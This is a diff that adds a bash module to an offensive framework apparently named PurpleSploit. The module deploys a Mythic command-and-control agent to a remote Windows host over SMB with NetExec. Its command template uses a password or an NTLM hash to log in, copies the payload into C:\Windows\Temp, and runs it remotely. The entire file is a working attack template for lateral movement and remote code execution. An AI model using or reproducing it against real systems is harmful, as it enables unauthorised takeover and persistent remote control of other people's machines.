@@ -1,0 +1,13 @@
+#!/bin/bash
+# Mythic Agent Deployment via SMB
+
+MODULE_NAME="c2/mythic/deploy_smb"
+MODULE_CATEGORY="c2"
+MODULE_DESCRIPTION="Deploy Mythic agent via SMB using NXC"
+MODULE_AUTHOR="PurpleSploit Team"
+MODULE_TOOL="mythic"
+
+REQUIRED_VARS="RHOST,USERNAME,MYTHIC_PAYLOAD"
+OPTIONAL_VARS="PASSWORD:,DOMAIN:,HASH:,REMOTE_PATH:C:\\Windows\\Temp\\agent.exe"
+
+COMMAND_TEMPLATE="nxc smb \${RHOST} -u \${USERNAME} -p '\${PASSWORD}' \${DOMAIN:+-d \$DOMAIN} \${HASH:+-H \$HASH} --put-file '\${MYTHIC_PAYLOAD}' '\${REMOTE_PATH}' && nxc smb \${RHOST} -u \${USERNAME} -p '\${PASSWORD}' \${DOMAIN:+-d \$DOMAIN} \${HASH:+-H \$HASH} -x '\${REMOTE_PATH}'"
